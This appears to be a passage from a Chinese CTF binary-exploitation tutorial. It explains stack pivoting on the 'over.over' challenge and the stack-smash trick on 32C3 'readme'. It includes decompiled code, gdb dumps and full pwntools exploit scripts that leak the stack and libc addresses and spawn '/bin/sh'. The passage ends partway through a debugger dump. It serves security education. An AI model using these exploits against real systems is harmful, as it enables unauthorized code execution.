+<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">sub_400676</span><span class="p">()</span> <span class="p">)</span>
+    <span class="p">;</span>
+  <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">sub_400676</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h]</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+  <span class="n">putchar</span><span class="p">(</span><span class="sc">&#39;&gt;&#39;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">96uLL</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>read 能读入 96 位, 但 buf 的长度只有 80, 因此只能覆盖 rbp 以及 ret addr 来进行 rop 了</p>
+<h5 id="_11">思路<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h5>
+<p>当栈溢出长度不够时，可以尝试 frame faking （栈迁移）。这就需要一个能被我们写入、知道地址的内存。这条题目的话，我们只能往栈上写入数据，所以想办法泄露栈地址。</p>
+<h6 id="leak-stack-addr">leak stack addr<a class="headerlink" href="#leak-stack-addr" title="Permanent link">&para;</a></h6>
+<p>栈地址每次运行都不一样，需要控制程序来泄露栈地址。这条题目没有开 canary ，然后在 IDA 或者 gdb 分析 sub_400676 的栈结构，发现 buf 覆盖 80 字节之后，就到 rbp 顶，读入的 read 也没有给字符串末尾接上 <code>\x00</code> 的结束符，所以可以将 ebp 的值泄露出来。</p>
+<p>ebp 的值是上一个栈的栈顶，泄露之后通过偏移计算得到 buf 写入的栈地址。gdb 调试后，得出偏移为 0x70</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># leak ebp</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>   
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x70</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stack:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+</code></pre></div>
+<h6 id="leak-libc">leak libc<a class="headerlink" href="#leak-libc" title="Permanent link">&para;</a></h6>
+<p>然后就是构造 ROP 链，因为可控写入是在栈上，所以构造如下：</p>
+<div class="highlight"><pre><span></span><code>ROP|padding|fake ebp|leave ret addr|
+</code></pre></div>
+<p><code>leave ret addr</code> 就用 ROPgadget 找一下：</p>
+<div class="highlight"><pre><span></span><code>~$ ROPgadget --binary over.over --only <span class="s1">&#39;leave|ret&#39;</span>
+Gadgets <span class="nv">information</span>
+<span class="o">============================================================</span>
+0x00000000004006be : leave <span class="p">;</span> ret
+0x0000000000400509 : ret
+0x00000000004007d0 : ret 0xfffe
+</code></pre></div>
+<p><code>fake ebp</code> 填入 buf 的真实地址。</p>
+<p><code>ROP</code> 两个功能：泄露 libc 地址、ret2text。泄露地址就用常规的 puts 函数。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># leak libc</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sub_addr</span><span class="p">)</span> <span class="c1"># ret2text</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+</code></pre></div>
+<h6 id="getshell">getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h6>
+<p>泄露地址之后就再一次 frame faking ，只不过这次是执行 <code>system("/bin/sh")</code> 。</p>
+<p>但是如果 fake ebp 依旧填写原值会报错，大概原因是因为上面 ROP 是直接调用 sub_400676 ，想比正常情况下压栈的数量和原来不一样，所以要重新计算偏移。</p>
+<p>fake ebp 使用 ROP1 的值时：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; 
+0x00000000004006be <span class="k">in</span> ?? <span class="o">()</span>
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+─────<span class="o">[</span> REGISTERS <span class="o">]</span>─────
+…………
+ RBP  0x7fffffffdd50 —▸ 0x7fffffffdd30 ◂— 0x6161616161616161 <span class="o">(</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="o">)</span>
+ RSP  0x7fffffffdd00 ◂— 0xdeadbeef
+ RIP  0x4006be ◂— leave  
+</code></pre></div>
+<p>可以看到 RBP 经过两次 leave|ret 之后指向的是 aaaaaaaa ，正常应该是指向 0xdeadbeef 。</p>
+<p>为了让程序执行正确地方，将 fake ebp 的值减 0x30 ，让 ebp 重新指向 0xdeadbeef ：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20gx 0x7fffffffdd30-0x30
+0x7fffffffdd00: 0x00000000deadbeef  0x0000000000400793
+0x7fffffffdd10: 0x00007ffff7b99d57  0x00007ffff7a52390
+0x7fffffffdd20: 0x0000000000400676  0x6161616161616161
+0x7fffffffdd30: 0x6161616161616161  0x6161616161616161
+0x7fffffffdd40: 0x6161616161616161  0x6161616161616161
+0x7fffffffdd50: 0x00007fffffffdd30  0x00000000004006be
+0x7fffffffdd60: 0x6161616161616161  0x6161616161616161
+0x7fffffffdd70: 0x6161616161616161  0x6161616161616161
+0x7fffffffdd80: 0x00007fffffffdd30  0x00000000004006be
+0x7fffffffdd90: 0x00007fffffffde88  0x0000000100000000
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nv">payload</span> <span class="o">=</span> p64<span class="o">(</span>0xdeadbeef<span class="o">)</span> + p64<span class="o">(</span>pop_rdi<span class="o">)</span> + p64<span class="o">(</span>binsh_addr<span class="o">)</span> + p64<span class="o">(</span>system_addr<span class="o">)</span>
+<span class="nv">payload</span> <span class="o">+=</span> p64<span class="o">(</span>sub_addr<span class="o">)</span> <span class="c1"># ret2text</span>
+<span class="nv">payload</span> <span class="o">=</span> payload.ljust<span class="o">(</span>0x50,<span class="s1">&#39;a&#39;</span><span class="o">)</span> <span class="c1"># padding</span>
+<span class="nv">payload</span> <span class="o">+=</span> p64<span class="o">(</span>stack<span class="o">)</span>
+<span class="nv">payload</span> <span class="o">+=</span> p64<span class="o">(</span>leave_ret<span class="o">)</span>
+</code></pre></div>
+<h5 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h5>
+<p><strong>system('/bin/sh')</strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./over.over&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./over.over&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400793</span>
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4006be</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sub_addr</span> <span class="o">=</span> <span class="mh">0x400676</span>
+
+<span class="c1"># leak ebp</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>   
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x70</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stack:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+
+<span class="c1"># leak libc</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sub_addr</span><span class="p">)</span> <span class="c1"># ret2text</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> 
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;system_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;binsh_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+
+<span class="c1"># system(&#39;/bin/sh&#39;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sub_addr</span><span class="p">)</span> <span class="c1"># ret2text</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> 
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><strong>execve("/bin/sh", 0, 0)</strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./over.over&quot;</span>
+
+<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;DEBUG: &quot;</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./over.over&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./over.over&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x70</span>
+<span class="n">success</span><span class="p">(</span><span class="s2">&quot;stack -&gt; </span><span class="si">{:#x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+
+
+<span class="c1">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;11111111&#39;</span><span class="p">,</span> <span class="mh">0x400793</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="mh">0x400676</span><span class="p">,</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">40</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="n">stack</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">]))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc.address -&gt; </span><span class="si">{:#x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">pop_rdi_ret</span><span class="o">=</span><span class="mh">0x400793</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</span>
+<span class="sd">0x00000000000f5279 : pop rdx ; pop rsi ; ret</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="n">pop_rdx_pop_rsi_ret</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xf5279</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span><span class="s1">&#39;22222222&#39;</span><span class="p">,</span> <span class="n">pop_rdi_ret</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)),</span><span class="n">pop_rdx_pop_rsi_ret</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;execve&#39;</span><span class="p">],</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">7</span><span class="o">*</span><span class="mi">8</span> <span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">])</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="stack-smash">Stack smash<a class="headerlink" href="#stack-smash" title="Permanent link">&para;</a></h2>
+<h3 id="_12">原理<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>在程序加了 canary 保护之后，当 canary 值变化后，程序会错误退出并提示错误信息，通常是说 xxx（程序名） 段错误。</p>
+<p>stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
+<div class="highlight"><pre><span></span><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+  __fortify_fail (&quot;stack smashing detected&quot;);
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
+{
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+}
+</code></pre></div>
+<p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p>
+<h3 id="32c3-ctf-readme">32C3 CTF readme<a class="headerlink" href="#32c3-ctf-readme" title="Permanent link">&para;</a></h3>
+<p>该题目在 jarvisoj 上有复现。</p>
+<h4 id="_13">确定保护<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。</p>
+<div class="highlight"><pre><span></span><code>Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre></div>
+<h4 id="_14">分析程序<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p>ida 看一下</p>
+<div class="highlight"><pre><span></span><code>__int64 sub_4007E0()
+{
+  __int64 v0; // rax@1
+  __int64 v1; // rbx@2
+  int v2; // eax@3
+  __int64 v4; // [sp+0h] [bp-128h]@1
+  __int64 v5; // [sp+108h] [bp-20h]@1
+
+  v5 = *MK_FP(__FS__, 40LL);
+  __printf_chk(1LL, (__int64)&quot;Hello!\nWhat&#39;s your name? &quot;);
+  LODWORD(v0) = _IO_gets((__int64)&amp;v4);
+  if ( !v0 )
+LABEL_9:
+    _exit(1);
+  v1 = 0LL;
+  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);
+  while ( 1 )
+  {
+    v2 = _IO_getc(stdin);
+    if ( v2 == -1 )
+      goto LABEL_9;
+    if ( v2 == &#39;\n&#39; )
+      break;
+    byte_600D20[v1++] = v2;
+    if ( v1 == &#39; &#39; )
+      goto LABEL_8;
+  }
+  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
+LABEL_8:
+  puts(&quot;Thank you, bye!&quot;);
+  return *MK_FP(__FS__, 40LL) ^ v5;
+}
+</code></pre></div>
+<p><code>_IO_gets((__int64)&amp;v4)</code> 存在栈溢出。</p>
+<p>程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句</p>
+<div class="highlight"><pre><span></span><code>  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
+</code></pre></div>
+<p>又看了看对应地址的内容，可以发现如下内容，说明程序的 flag 就在这里。</p>
+<div class="highlight"><pre><span></span><code>.data:0000000000600D20 ; char aPctfHereSTheFl[]
+.data:0000000000600D20 aPctfHereSTheFl db &#39;PCTF{Here&#39;,27h,&#39;s the flag on server}&#39;,0
+</code></pre></div>
+<p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 <code>byte_600D20[v1++] = v2;</code>也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p>
+<ul>
+<li><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出</strong>，可以使用 gdb 的 find 来进行查找。</li>
+</ul>
+<h4 id="flag">确定 flag 地址<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h4>
+<p>我们把断点下载 memset 函数（0x400873）处，然后读取相应的内容如下</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; b *0x400873
+Breakpoint <span class="m">1</span> at 0x400873
+pwndbg&gt; r
+Starting program: /home/skye/readme.bin 
+Hello!
+What<span class="s1">&#39;s your name? aaaaaaaa</span>
+<span class="s1">Nice to meet you, aaaaaaaa.</span>
+<span class="s1">Please overwrite the flag: bbbbbbbb</span>
+
+<span class="s1">Breakpoint 1, 0x0000000000400873 in ?? ()</span>
+<span class="s1">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span>
+<span class="s1">────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────</span>
+<span class="s1"> RAX  0xa</span>
+<span class="s1"> RBX  0x8</span>
+<span class="s1"> RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span>
+<span class="s1"> RDX  0x18</span>
+<span class="s1"> # flag 存放地址</span>
+<span class="s1"> RDI  0x600d28 ◂— &#39;</span>ServerHasTheFlagHere...<span class="s1">&#39;</span>
+<span class="s1"> RSI  0x0</span>
+<span class="s1"> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span>
+<span class="s1"> R9   0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span>
+<span class="s1"> R10  0x814</span>
+<span class="s1"> R11  0x246</span>
+<span class="s1"> R12  0x4006ee ◂— xor    ebp, ebp</span>
+<span class="s1"> R13  0x7fffffffdd70 ◂— 0x1</span>
+<span class="s1"> R14  0x0</span>
+<span class="s1"> R15  0x0</span>
+<span class="s1"> RBP  0x4008b0 ◂— push   r15</span>
+<span class="s1"> RSP  0x7fffffffdb60 ◂— &#39;</span>aaaaaaaa<span class="s1">&#39;</span>
+<span class="s1"> RIP  0x400873 ◂— call   0x400670</span>
+<span class="s1">─────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────</span>
+<span class="s1"> ► 0x400873    call   memset@plt &lt;0x400670&gt;</span>
+<span class="s1">        # flag 存放地址</span>
+<span class="s1">        s: 0x600d28 ◂— &#39;</span>ServerHasTheFlagHere...<span class="s1">&#39;</span>
+<span class="s1">        c: 0x0</span>
+<span class="s1">        n: 0x18</span>
+
+<span class="s1">   0x400878    mov    edi, 0x40094e</span>
+<span class="s1">   0x40087d    call   puts@plt &lt;0x400640&gt;</span>
+
+<span class="s1">   0x400882    mov    rax, qword ptr [rsp + 0x108]</span>
+<span class="s1">   0x40088a    xor    rax, qword ptr fs:[0x28]</span>
+<span class="s1">   0x400893    jne    0x4008a9</span>
+
+<span class="s1">   0x400895    add    rsp, 0x118</span>
+<span class="s1">   0x40089c    pop    rbx</span>
+<span class="s1">   0x40089d    pop    rbp</span>
+<span class="s1">   0x40089e    ret    </span>
+
+<span class="s1">   0x40089f    mov    edi, 1</span>
+<span class="s1">──────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────</span>
+<span class="s1"># name 存放地址</span>
+<span class="s1">00:0000│ rsp  0x7fffffffdb60 ◂— &#39;</span>aaaaaaaa<span class="err">&#39;</span>
